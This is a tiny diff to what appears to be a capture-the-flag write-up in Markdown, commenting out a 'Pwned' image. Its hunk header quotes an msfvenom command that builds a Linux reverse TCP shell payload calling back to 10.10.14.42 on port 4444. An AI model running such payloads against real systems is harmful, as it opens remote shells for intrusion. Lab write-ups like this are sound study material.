@@ -717,7 +717,7 @@ msfvenom -p linux/x64/shell/reverse_tcp LHOST=10.10.14.42 LPORT=4444 -f elf-so -
 
 **Pwned**
 
-# ![Pwned](./images/Pwned.png)
+<!-- ![Pwned](./images/Pwned.png) -->
 
 ---
 
